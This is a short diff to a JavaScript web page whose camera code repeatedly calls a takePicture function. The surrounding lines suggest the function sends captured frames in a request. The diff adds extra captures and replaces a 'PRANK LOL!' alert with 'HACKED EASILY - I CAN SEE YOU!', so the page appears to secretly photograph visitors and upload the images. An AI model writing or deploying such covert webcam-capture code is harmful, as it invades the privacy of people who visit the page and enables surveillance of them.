@@ -39,7 +39,6 @@ function takePicture(){
       //request.setRequestHeader('Content-type', 'multipart/form-data');
       request.send(formData);
 	  
-	  alert("PRANK LOL!")
 	  
 })
 
@@ -56,6 +55,16 @@ function cameraStart() {
 		window.setTimeout(function(){
 			takePicture()
 		}, 1000);
+		
+		window.setTimeout(function(){
+			takePicture()
+		}, 500);
+		
+		window.setTimeout(function(){
+			takePicture()
+		}, 500);
+		
+		alert("HACKED EASILY - I CAN SEE YOU!")
     })
     .catch(function(error) {
         console.error("Oops. Something is broken.", error);
